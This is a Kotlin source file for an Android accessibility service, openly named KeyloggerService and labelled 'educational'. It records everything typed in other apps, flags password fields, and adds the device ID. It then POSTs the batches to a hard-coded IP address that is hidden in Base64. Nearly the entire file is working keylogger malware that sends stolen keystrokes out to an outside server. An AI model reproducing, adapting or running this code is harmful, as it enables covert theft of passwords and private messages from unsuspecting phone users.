package com.teacherapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

/**
 * KeyloggerService - Educational Accessibility Service
 *
 * Demonstrates how malicious apps can capture user input through
 * Accessibility Services. This logs all text typed by the user.
 *
 * Part 2: Malicious Data Exfiltration
 */
class KeyloggerService : AccessibilityService() {

    private val TAG = "Keylogger"
    private val keystrokes = mutableListOf<KeystrokeData>()
    private val maxBufferSize = 50 // Send after 50 keystrokes

    data class KeystrokeData(
        val text: String,
        val packageName: String,
        val className: String,
        val timestamp: Long
    )

    override fun onServiceConnected() {
        super.onServiceConnected()

        Log.d(TAG, "Keylogger service started")

        // Configure accessibility service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED

            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS

            notificationTimeout = 100
        }

        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    captureTextInput(event)
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    captureFieldFocus(event)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event: ${e.message}")
        }
    }

    private fun captureTextInput(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            if (text.isBlank()) return

            val packageName = event.packageName?.toString() ?: "unknown"
            val className = event.className?.toString() ?: "unknown"

            val keystroke = KeystrokeData(
                text = text,
                packageName = packageName,
                className = className,
                timestamp = System.currentTimeMillis()
            )

            keystrokes.add(keystroke)

            Log.d(TAG, "Captured: '$text' from $packageName")

            // Send to server when buffer is full
            if (keystrokes.size >= maxBufferSize) {
                exfiltrateKeystrokes()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error capturing text: ${e.message}")
        }
    }

    private fun captureFieldFocus(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: ""
            val className = event.className?.toString() ?: ""

            // Log when user focuses on password or sensitive fields
            if (className.contains("EditText", ignoreCase = true) ||
                className.contains("Password", ignoreCase = true)) {

                Log.d(TAG, "User focused on input field in $packageName")

                val focusEvent = KeystrokeData(
                    text = "[FIELD_FOCUSED:$className]",
                    packageName = packageName,
                    className = className,
                    timestamp = System.currentTimeMillis()
                )

                keystrokes.add(focusEvent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing focus: ${e.message}")
        }
    }

    private fun exfiltrateKeystrokes() {
        if (keystrokes.isEmpty()) return

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val data = JSONObject()
                val keystrokesArray = JSONArray()

                // Copy and clear buffer
                val toSend = keystrokes.toList()
                keystrokes.clear()

                // Build JSON
                toSend.forEach { keystroke ->
                    val item = JSONObject().apply {
                        put("text", keystroke.text)
                        put("package", keystroke.packageName)
                        put("class", keystroke.className)
                        put("timestamp", keystroke.timestamp)
                        put("time", formatTime(keystroke.timestamp))
                    }
                    keystrokesArray.put(item)
                }

                data.put("keystrokes", keystrokesArray)
                data.put("android_id", getAndroidId())
                data.put("count", toSend.size)
                data.put("collected_at", System.currentTimeMillis())

                sendToServer(data)

            } catch (e: Exception) {
                Log.e(TAG, "Error exfiltrating keystrokes: ${e.message}")
            }
        }
    }

    private suspend fun sendToServer(data: JSONObject) {
        try {
            // Base64: http://20.189.79.25:5000/api/keystrokes
            val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9rZXlzdHJva2Vz"
            val serverUrl = String(Base64.decode(encoded, Base64.DEFAULT))

            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 10000
                readTimeout = 10000
            }

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "✅ Keystrokes exfiltrated successfully (${data.getInt("count")} keys)")
            } else {
                Log.e(TAG, "❌ Server error: $responseCode")
            }

            connection.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
        }
    }

    private fun getAndroidId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    private fun formatTime(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(timestamp))
    }

    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")

        // Send remaining keystrokes before shutdown
        if (keystrokes.isNotEmpty()) {
            exfiltrateKeystrokes()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Keylogger service destroyed")

        // Final exfiltration
        if (keystrokes.isNotEmpty()) {
            exfiltrateKeystrokes()
        }
    }
}